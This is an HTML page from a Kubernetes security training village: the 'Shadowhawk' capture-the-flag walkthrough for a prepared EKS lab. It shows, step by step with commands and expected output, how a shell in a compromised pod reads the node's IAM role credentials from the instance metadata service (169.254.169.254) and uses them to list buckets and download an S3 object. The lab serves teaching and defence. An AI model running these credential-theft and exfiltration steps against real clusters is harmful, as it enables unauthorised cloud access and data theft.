@@ -1,0 +1,734 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Puma Security's Hackers Teaching Hackers (HTH) 2024 Kubernetes Village">
+      
+      
+        <meta name="author" content="Eric Johnson">
+      
+      
+      
+        <link rel="prev" href="../airborneio-24/">
+      
+      
+        <link rel="next" href="../api-key/">
+      
+      
+      <link rel="icon" href="../img/pumasecurity.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
+    
+    
+      
+        <title>Shadowhawk - HTH 2024 Kubernetes Security Village</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Source Code Pro"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../css/jquery.fancybox.min.css">
+    
+      <link rel="stylesheet" href="../css/html.css">
+    
+      <link rel="stylesheet" href="../css/custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shadowhawk-challenge" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="HTH 2024 Kubernetes Security Village" class="md-header__button md-logo" aria-label="HTH 2024 Kubernetes Security Village" data-md-component="logo">
+      
+  <img src="../img/pumasecurity.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HTH 2024 Kubernetes Security Village
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Shadowhawk
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="HTH 2024 Kubernetes Security Village" class="md-nav__button md-logo" aria-label="HTH 2024 Kubernetes Security Village" data-md-component="logo">
+      
+  <img src="../img/pumasecurity.png" alt="logo">
+
+    </a>
+    HTH 2024 Kubernetes Security Village
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Initial Access
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../airborneio-24/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Airborneio-24
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Shadowhawk
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Shadowhawk
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pod-permission-inheritance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Permission Inheritance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pod-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#next-challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Next Challenge
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../api-key/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    API Key
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cascadia-cvr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cascadia CVR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pod-permission-inheritance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Permission Inheritance
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pod-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pod Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#next-challenge" class="md-nav__link">
+    <span class="md-ellipsis">
+      Next Challenge
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="shadowhawk-challenge">Shadowhawk Challenge</h1>
+<p>The <em>Shadowhawk</em> challenge requires you to find a flag located in the AWS Simple Storage Service (S3). Unfortunately, the <em>kubeace-maverick</em> IAM user does not have permissions to the AWS S3 API. Without direct access to S3, you will need to use the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" rel="noopener" target="_blank">AWS Instance Metadata Service IMDS</a> to escalate your AWS permissions and gain access to the flag.</p>
+<h2 id="pod-permission-inheritance">Pod Permission Inheritance</h2>
+<p>Cloud managed Kubernetes services (AWS EKS, Azure AKS, and Google's GKE) typically create Kubernetes node(s) using the cloud provider's virtual machine service. Each node usually needs cloud permissions to read private container images and create network interfaces, load balancers, and other network components for connecting Kubernetes ingress and service resources. These permissions can be granted to the cloud virtual machine using an AWS IAM Role, Azure Managed Identity, or Google Service account attached to the virtual machine. It is important to realize that pods running on the node also inherit these permissions.</p>
+<p>Pods running on the node may also need access to cloud resources such as storage, secrets, and backend databases. These permissions are often granted to the node's service account, which means that any pod running on the node inherits all of these permissions.</p>
+<p>Attackers gaining access to an EKS cluster will attempt to discover service account credentials using the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/" rel="noopener" target="_blank">Instance Metadata API</a> attacker technique. By default, this technique can allow a pod running on the node to communicate with the node's instance metadata service (IMDS), retrieve temporary instance profile credentials, and potentially escalate permissions.</p>
+<ol>
+<li>
+<p>Using your Terminal, verify that <em>kubeace-maverick</em> IAM user does not have access to list the S3 buckets in the AWS account hosting the EKS cluster. What error message is returned?</p>
+<details class="tip">
+<summary>Hint</summary>
+<p>Run <code>aws s3api list-buckets</code> command to list the S3 buckets in the AWS account.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3api<span class="w"> </span>list-buckets
+</code></pre></div>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The list buckets command will return an unauthorized error because the <em>kubeace-maverick</em> IAM user does not have access to list the S3 buckets in the account.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:iam::123456789012:user/kubeace-maverick-randomid is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>Given a scenario where the <code>ui</code> pod is compromised, an attacker can use the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/" rel="noopener" target="_blank">Instance Metadata API</a> attacker technique to obtain temporary credentials from the node. Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod and exfiltrate credentials from the node's instance metadata service (IMDS). What is the name of the IAM role attached to the Kubernetes node? What IMDS endpoint can read temporary credentials for the IAM role?</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>List the pods running in the <code>hth</code> namespace. Make a note of the <em>ui</em> pod's name, as you will need this in the next step.</p>
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-n<span class="w"> </span>hth
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>NAME<span class="w">            </span>READY<span class="w">   </span>STATUS<span class="w">    </span>RESTARTS<span class="w">   </span>AGE
+api-randomid<span class="w">    </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>2d21h
+ui-randomid<span class="w">     </span><span class="m">1</span>/1<span class="w">     </span>Running<span class="w">   </span><span class="m">0</span><span class="w">          </span>2d21h
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Use the <code>kubectl exec</code> command to obtain a shell on the <code>ui</code> pod.</p>
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>--stdin<span class="w"> </span>--tty<span class="w"> </span>-n<span class="w"> </span>hth<span class="w"> </span>ENTER_UI_POD_NAME<span class="w"> </span>--<span class="w"> </span>/bin/bash
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>root@ui-randomid:/#
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Once inside the pod, query the IMDS endpoint (169.254.169.254) to view the list of IAM roles with security credentials on the node.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>echo<span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Use the role's name to view the role's temporary security credentials. Make a note of the <strong>AccessKeyId</strong>, <strong>SecretAccessKey</strong>, and <strong>Token</strong> values for the next step.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/?????/<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>echo<span class="p">;</span>
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="o">{</span>
+<span class="w">  </span>...
+<span class="w">  </span><span class="s2">&quot;Type&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;AWS-HMAC&quot;</span>,
+<span class="hll"><span class="w">  </span><span class="s2">&quot;AccessKeyId&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="hll"><span class="w">  </span><span class="s2">&quot;SecretAccessKey&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="hll"><span class="w">  </span><span class="s2">&quot;Token&quot;</span><span class="w"> </span>:<span class="w"> </span><span class="s2">&quot;?????&quot;</span>,
+</span><span class="w">  </span>...
+<span class="o">}</span>
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Run the following command to exit the shell and return to your local machine.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">exit</span>
+</code></pre></div>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The AWS IAM Role attached to the Kubernetes node is <strong>hth-node-role-randomid</strong>. Which tells you that the command to obtain temporary credentials is...</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/hth-node-role-randomid/
+</code></pre></div>
+</details>
+</li>
+</ol>
+<h2 id="pod-privilege-escalation">Pod Privilege Escalation</h2>
+<p>With the Kubernetes node's temporary instance profile credentials in hand, use those credentials to exfiltrate the <strong>Shadowhawk</strong> flag from S3. Open a new Terminal on your machine and set the required <a href="https://docs.aws.amazon.com/cli/v1/userguide/cli-configure-envvars.html" rel="noopener" target="_blank">AWS CLI environment variables</a> to use the node's temporary credentials. Then, use the AWS CLI to find the flag.</p>
+<ol>
+<li>
+<p>Set the required AWS CLI environment variables to use the node's temporary credentials. What is the name of the S3 bucket that contains the <code>shadowhawk</code> flag.</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Make sure you open a new Terminal session. Then, set each of the following environment variables to the configure the new Terminal session. Replace the <code>NODE_ROLE_ACCESS_KEY_ID</code>, <code>NODE_ROLE_SECRET_ACCESS_KEY</code>, and <code>NODE_ROLE_SESSION_TOKEN</code> placeholders with the values obtained from the previous step.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>ENTER_NODE_ROLE_ACCESS_KEY_ID
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>ENTER_NODE_ROLE_SECRET_ACCESS_KEY
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>ENTER_NODE_ROLE_SESSION_TOKEN
+<span class="nb">export</span><span class="w"> </span><span class="nv">AWS_DEFAULT_REGION</span><span class="o">=</span>us-west-2
+</code></pre></div>
+</li>
+<li>
+<p>Run the <code>aws sts get-caller-identity</code> command to verify you have properly configured the IAM role's temporary credentials. The output should show you are authenticating as the node's EC2 instance profile role.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">{</span>
+<span class="go">  &quot;UserId&quot;: &quot;AROASZY2ZSU65B7QQKFEP:i-0304eb3fda5d5c44d&quot;,</span>
+<span class="go">  &quot;Account&quot;: &quot;123456789012&quot;,</span>
+<span class="go">  &quot;Arn&quot;: &quot;arn:aws:sts::123456789012:assumed-role/hth-node-role-random-id/i-0304eb3fda5d5c44d&quot;</span>
+<span class="go">}</span>
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>List all of the S3 buckets in the account that contain the keyword <strong>hth</strong>. The output will show an audit logs bucket alongside an <code>hth</code> bucket containing the <strong>shadowhawk</strong> flag.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3api<span class="w"> </span>list-buckets<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;hth&quot;</span>
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">&quot;Name&quot;: &quot;hth-audit-logs-randomid&quot;,</span>
+<span class="hll"><span class="go">&quot;Name&quot;: &quot;?????&quot;,</span>
+</span></code></pre></div>
+</div>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<p>The S3 bucket that contains the <code>shadowhawk</code> flag is <strong>hth-randomid</strong>.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">&quot;Name&quot;: &quot;hth-randomid&quot;,</span>
+</code></pre></div>
+</div>
+</details>
+</li>
+<li>
+<p>List the objects in the S3 bucket and exfiltrate the object that contains the <code>shadowhawk</code> flag.</p>
+<details class="tip">
+<summary>Hint</summary>
+<ul>
+<li>
+<p>Use the <code>aws s3api list-objects</code> command to list the objects in the S3 bucket. The output will show the object that contains the flag.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3api<span class="w"> </span>list-objects<span class="w"> </span>--bucket<span class="w"> </span>?????<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span><span class="s1">&#39;.Contents[].Key&#39;</span>
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>&quot;flightplans/cascadia-explorer.txt&quot;
+&quot;flightplans/ny-la-express.txt&quot;
+<span class="hll">&quot;?????/?????&quot;
+</span>&quot;flightplans/thames-to-seine.txt&quot;
+&quot;pilots/pilots.csv&quot;
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Use the <code>aws s3api get-object</code> command to copy the object that contains the flag to your local file system.</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3api<span class="w"> </span>get-object<span class="w"> </span>--bucket<span class="w"> </span>?????<span class="w"> </span>--key<span class="w"> </span>?????<span class="w"> </span>/path/to/your/downloads/?????.txt
+</code></pre></div>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code><span class="go">{</span>
+<span class="go">  &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span>
+<span class="go">  &quot;LastModified&quot;: &quot;2024-10-30T18:00:03+00:00&quot;,</span>
+<span class="go">  &quot;ContentLength&quot;: 1124,</span>
+<span class="go">  &quot;ETag&quot;: &quot;\&quot;77f6f010d81c99754efa3acc70d4b35d\&quot;&quot;,</span>
+<span class="go">  &quot;ContentType&quot;: &quot;application/octet-stream&quot;,</span>
+<span class="go">  &quot;ServerSideEncryption&quot;: &quot;AES256&quot;,</span>
+<span class="go">  &quot;Metadata&quot;: {},</span>
+<span class="go">  &quot;TagCount&quot;: 3</span>
+<span class="go">}</span>
+</code></pre></div>
+</div>
+</li>
+<li>
+<p>Open the file to find the <code>shadowhawk</code> flag.</p>
+</li>
+</ul>
+</details>
+<details class="success">
+<summary>Answer</summary>
+<ul>
+<li>
+<p>The command to download the object that contains the <code>shadowhawk</code> flag is...</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3api<span class="w"> </span>get-object<span class="w"> </span>--bucket<span class="w"> </span>hth-randomid<span class="w"> </span>--key<span class="w"> </span>flightplans/shadowhawk.txt<span class="w"> </span>~/Downloads/shadowhawk.txt
+</code></pre></div>
+</li>
+<li>
+<p>Open the file and find the <em>Startup Code</em> line, which contains the flag.</p>
+<div class="admonition abstract">
+<p class="admonition-title">Expected Output</p>
+<div class="highlight"><pre><span></span><code>Startup Code: hth{?????}
+</code></pre></div>
+</div>
+</li>
+</ul>
+</details>
+</li>
+</ol>
+<h2 id="next-challenge">Next Challenge</h2>
+<p>Congratulations! You have identified a privilege escalation opportunity using the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/" rel="noopener" target="_blank">Instance Metadata API</a> attacker technique and exfiltrated the <strong>Shadowhawk</strong> flag from the compromised AWS account.</p>
+<p>Before you move on to the next challenge, make sure you clear the environment variables that are using the node's temporary credentials. This can be done by closing your Terminal or running the following <em>unset</em> command.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">unset</span><span class="w"> </span>AWS_ACCESS_KEY_ID<span class="w"> </span>AWS_SECRET_ACCESS_KEY<span class="w"> </span>AWS_SESSION_TOKEN
+</code></pre></div>
+<p>Continue to the <a href="../api-key/">API Key Challenge</a> to learn how Kubernetes secrets are attached to a pod.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      ©2024 Puma Security, LLC. All rights reserved.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.indexes", "content.code.annotate", "content.code.copy", {"header.autohide": false}], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../js/jquery.min.js"></script>
+      
+        <script src="../js/jquery.fancybox.min.js"></script>
+      
+        <script src="../js/workbook.js"></script>
+      
+        <script src="../js/custom.js"></script>
+      
+    
+  </body>
+</html>
